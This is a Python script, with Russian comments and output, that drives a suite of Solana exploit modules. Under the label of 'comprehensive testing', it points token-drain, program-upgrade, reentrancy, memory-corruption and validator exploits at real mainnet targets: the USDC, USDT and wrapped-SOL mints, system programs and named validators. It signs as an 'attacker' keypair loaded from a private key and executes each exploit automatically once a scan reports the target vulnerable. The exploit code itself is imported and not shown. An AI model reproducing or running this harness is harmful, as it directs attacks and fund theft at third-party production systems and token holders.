"""
Комплексное тестирование всех эксплойт-модулей
"""

import asyncio
import json
import os
from datetime import datetime
from typing import Dict, List, Any
from pathlib import Path
from enum import Enum

# Добавляем путь к src в PYTHONPATH
import sys
sys.path.insert(0, str(Path(__file__).parent / "src"))

from solders.pubkey import Pubkey as PublicKey
from solders.keypair import Keypair
from solana.rpc.async_api import AsyncClient
from src.exploits.exploit_manager import ExploitManager
from src.exploits.base_exploit import ExploitType
from dotenv import load_dotenv

def convert_to_json_serializable(obj):
    """Конвертирует объекты в JSON-совместимый формат"""
    if isinstance(obj, Enum):
        return obj.value
    elif isinstance(obj, (PublicKey, Keypair)):
        return str(obj)
    elif isinstance(obj, bytes):
        return obj.hex()  # Конвертируем bytes в hex строку
    elif isinstance(obj, dict):
        return {k: convert_to_json_serializable(v) for k, v in obj.items()}
    elif isinstance(obj, list):
        return [convert_to_json_serializable(item) for item in obj]
    elif hasattr(obj, '__dict__'):
        return convert_to_json_serializable(obj.__dict__)
    else:
        return obj

# Загружаем переменные окружения
load_dotenv()

# Тестовые цели для разных типов эксплойтов
TEST_TARGETS = {
    # Известные программы и токены для тестирования
    "programs": [
        "11111111111111111111111111111111",  # System Program
        "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",  # Token Program
        "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL",  # Associated Token Program
        "SysvarRent111111111111111111111111111111111",  # Rent Sysvar
        "SysvarC1ock11111111111111111111111111111111",  # Clock Sysvar
    ],
    
    # Популярные токены для тестирования
    "tokens": [
        "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v",  # USDC
        "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB",  # USDT
        "So11111111111111111111111111111111111111112",  # Wrapped SOL
        "7vfCXTUXx5WJV5JADk17DUJ4ksgau7utNKj4b963voxs",  # ETH (Wormhole)
        "mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So",  # mSOL
    ],
    
    # Известные валидаторы
    "validators": [
        "CertusDeBmqN8ZawdkxK5kFGMwBXdudvWHYwtNgNhvLu",  # Certus One
        "DWvDTSh3qfn88UoQTEKRV2JnLt5jtJAVoiCo3ivtMwXP",  # Figment
        "7Np41oeYqPefeNQEHSv1UDhYrehxin3NStELsSKCT4K2",  # Coinbase Cloud
    ],
    
    # Наши тестовые аккаунты (если есть)
    "test_accounts": [
        "EUU3QLhwi5zqDGEWPiGjXtr63oD7BL8zHStTNJ2cstaL",
        "BzBgmykB3D35SttCsra93AnVPdCHFgtw2J5o7rKGL8UM"
    ]
}

async def test_all_exploits():
    """Запускает все эксплойты на тестовых целях"""
    
    print("[START] ЗАПУСК КОМПЛЕКСНОГО ТЕСТИРОВАНИЯ ЭКСПЛОЙТОВ")
    print(f"[TIME] Время начала: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 70)
    
    # Инициализация менеджера эксплойтов
    rpc_url = os.getenv("SOLANA_RPC_URL")
    if not rpc_url:
        print("[ERROR] SOLANA_RPC_URL не найден в .env")
        return
    
    # Создаем или загружаем keypair
    private_key = os.getenv("SOLANA_PRIVKEY")
    if private_key:
        # Загружаем из приватного ключа
        try:
            import base58
            # Если ключ в hex формате
            if len(private_key) == 128:  # 64 байта в hex = 128 символов
                key_bytes = bytes.fromhex(private_key)
            else:
                # Если в base58
                key_bytes = base58.b58decode(private_key)
            keypair = Keypair.from_seed(key_bytes[:32])
        except Exception as e:
            print(f"[ERROR] Ошибка загрузки приватного ключа: {e}")
            keypair = Keypair()
    else:
        # Создаем новый keypair для тестов
        keypair = Keypair()
        print(f"[INFO] Создан тестовый keypair: {keypair.pubkey()}")
    
    manager = ExploitManager(rpc_url=rpc_url, attacker_keypair=keypair)
    
    # Статистика результатов
    results = {
        "total_tests": 0,
        "successful": 0,
        "failed": 0,
        "errors": 0,
        "by_type": {},
        "details": []
    }
    
    # Тестируем каждый тип эксплойта
    exploit_types = [
        ExploitType.ACCOUNT_MANIPULATION,
        ExploitType.TOKEN_DRAIN,
        ExploitType.PROGRAM_UPGRADE,
        ExploitType.CROSS_PROGRAM_INVOCATION,  # reentrancy
        ExploitType.MEMORY_CORRUPTION,
        ExploitType.VALIDATOR_EXPLOIT
    ]
    
    for exploit_type in exploit_types:
        print(f"\n[TEST] Тестирование {exploit_type.value} эксплойтов...")
        results["by_type"][exploit_type.value] = {
            "tests": 0,
            "success": 0,
            "failed": 0
        }
        
        # Выбираем подходящие цели для типа эксплойта
        if exploit_type in [ExploitType.PROGRAM_UPGRADE, ExploitType.CROSS_PROGRAM_INVOCATION]:
            targets = TEST_TARGETS["programs"]
        elif exploit_type == ExploitType.TOKEN_DRAIN:
            targets = TEST_TARGETS["tokens"]
        elif exploit_type == ExploitType.VALIDATOR_EXPLOIT:
            targets = TEST_TARGETS["validators"]
        elif exploit_type == ExploitType.ACCOUNT_MANIPULATION:
            targets = TEST_TARGETS["test_accounts"] + TEST_TARGETS["tokens"][:2]
        elif exploit_type == ExploitType.MEMORY_CORRUPTION:
            targets = TEST_TARGETS["programs"][:2]  # Только системные программы
        else:
            targets = TEST_TARGETS["programs"][:2]
        
        # Тестируем на каждой цели
        for target in targets:
            results["total_tests"] += 1
            results["by_type"][exploit_type.value]["tests"] += 1
            
            print(f"  [TARGET] Цель: {target[:8]}...")
            
            try:
                # Сканируем цель
                scan_result = await manager.scan_target(target, exploit_type)
                
                if scan_result and scan_result.get("vulnerable", False):
                    print(f"    [OK] Уязвимость обнаружена!")
                    
                    # Пытаемся эксплуатировать
                    vulnerabilities = scan_result.get("vulnerabilities", [])
                    exploit_result = await manager.execute_exploit(
                        target=target,
                        exploit_type=exploit_type,
                        vulnerabilities=vulnerabilities
                    )
                    
                    if exploit_result and exploit_result.get("success", False):
                        results["successful"] += 1
                        results["by_type"][exploit_type.value]["success"] += 1
                        print(f"    [SUCCESS] Эксплойт успешен!")
                    else:
                        results["failed"] += 1
                        results["by_type"][exploit_type.value]["failed"] += 1
                        print(f"    [FAIL] Эксплойт не удался")
                else:
                    print(f"    [WARN] Цель не уязвима")
                    results["failed"] += 1
                    results["by_type"][exploit_type.value]["failed"] += 1
                
                # Сохраняем детали
                results["details"].append({
                    "exploit_type": exploit_type.value,
                    "target": target,
                    "scan_result": convert_to_json_serializable(scan_result),
                    "timestamp": datetime.now().isoformat()
                })
                
            except Exception as e:
                results["errors"] += 1
                print(f"    [ERROR] Ошибка: {str(e)[:50]}...")
                
                results["details"].append({
                    "exploit_type": exploit_type.value,
                    "target": target,
                    "error": str(e),
                    "timestamp": datetime.now().isoformat()
                })
    
    # Выводим итоговую статистику
    print("\n" + "=" * 70)
    print("[STATS] ИТОГОВАЯ СТАТИСТИКА:")
    print(f"  - Всего тестов: {results['total_tests']}")
    print(f"  - Успешных: {results['successful']} ({results['successful']/results['total_tests']*100:.1f}%)")
    print(f"  - Неудачных: {results['failed']} ({results['failed']/results['total_tests']*100:.1f}%)")
    print(f"  - Ошибок: {results['errors']} ({results['errors']/results['total_tests']*100:.1f}%)")
    
    print("\n[BREAKDOWN] По типам эксплойтов:")
    for exploit_type, stats in results["by_type"].items():
        if stats["tests"] > 0:
            success_rate = stats["success"] / stats["tests"] * 100
            print(f"  - {exploit_type}: {stats['success']}/{stats['tests']} ({success_rate:.1f}%)")
    
    # Сохраняем детальный отчет
    report_path = Path("exploit_test_report.json")
    with open(report_path, "w", encoding="utf-8") as f:
        json.dump(convert_to_json_serializable(results), f, indent=2, ensure_ascii=False)
    
    print(f"\n[SAVED] Детальный отчет сохранен в: {report_path}")
    print(f"[TIME] Время завершения: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    
    return results

async def test_specific_exploit():
    """Тестирует конкретный эксплойт на выбранной цели"""
    
    print("\n[SPECIFIC] ТЕСТИРОВАНИЕ КОНКРЕТНОГО ЭКСПЛОЙТА")
    print("=" * 50)
    
    # Тестируем token_exploit_fixed на USDC
    from src.exploits.token_exploit_fixed import TokenExploitFixed, TokenExploitConfig, TokenVulnerability
    
    target = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"  # USDC
    
    try:
        # Получаем параметры для эксплойта
        rpc_url = os.getenv("SOLANA_RPC_URL")
        private_key = os.getenv("SOLANA_PRIVKEY")
        
        if private_key:
            try:
                import base58
                # Если ключ в hex формате
                if len(private_key) == 128:  # 64 байта в hex = 128 символов
                    key_bytes = bytes.fromhex(private_key)
                else:
                    # Если в base58
                    key_bytes = base58.b58decode(private_key)
                keypair = Keypair.from_seed(key_bytes[:32])
            except Exception as e:
                print(f"[ERROR] Ошибка загрузки приватного ключа: {e}")
                keypair = Keypair()
        else:
            keypair = Keypair()
        
        # Создаем клиент
        client = AsyncClient(rpc_url)
        
        exploit = TokenExploitFixed(client, attacker_keypair=keypair)
        
        # Сканируем на уязвимости
        print(f"[SCAN] Сканирование {target} (USDC)...")
        scan_result = await exploit.scan_token_vulnerabilities(PublicKey.from_string(target))
        
        print(f"[RESULT] Результат сканирования:")
        if scan_result:
            for vuln in scan_result:
                print(f"  - {vuln.value if hasattr(vuln, 'value') else vuln}")
        else:
            print("  - Уязвимости не найдены")
        
        # Пробуем арбитраж (в безопасном режиме)
        if TokenVulnerability.LIQUIDITY_POOL_IMBALANCE in scan_result:
            print("\n[ARBITRAGE] Попытка арбитража...")
            config = TokenExploitConfig(
                target_mint=PublicKey.from_string(target),
                exploit_type=TokenVulnerability.LIQUIDITY_POOL_IMBALANCE,
                use_flash_loan=False  # Без flash loan для теста
            )
            
            result = await exploit.execute_exploit(target, config)
            print(f"[RESULT] Результат: {result.status.value}")
            if result.error_message:
                print(f"  [ERROR] Ошибка: {result.error_message}")
                
    except Exception as e:
        print(f"[ERROR] Ошибка при тестировании: {e}")

async def main():
    """Главная функция"""
    
    # Проверяем наличие необходимых переменных окружения
    if not os.getenv("SOLANA_RPC_URL"):
        print("[ERROR] SOLANA_RPC_URL не установлен в .env")
        return
    
    if not os.getenv("SOLANA_TARGET_ADDRESS"):
        print("[ERROR] SOLANA_TARGET_ADDRESS не установлен в .env")
        return
    
    # Запускаем тесты
    try:
        # Основные тесты всех эксплойтов
        await test_all_exploits()
        
        # Дополнительный специфичный тест
        await test_specific_exploit()
        
    except KeyboardInterrupt:
        print("\n[WARN] Тестирование прервано пользователем")
    except Exception as e:
        print(f"\n[CRITICAL] Критическая ошибка: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    asyncio.run(main())
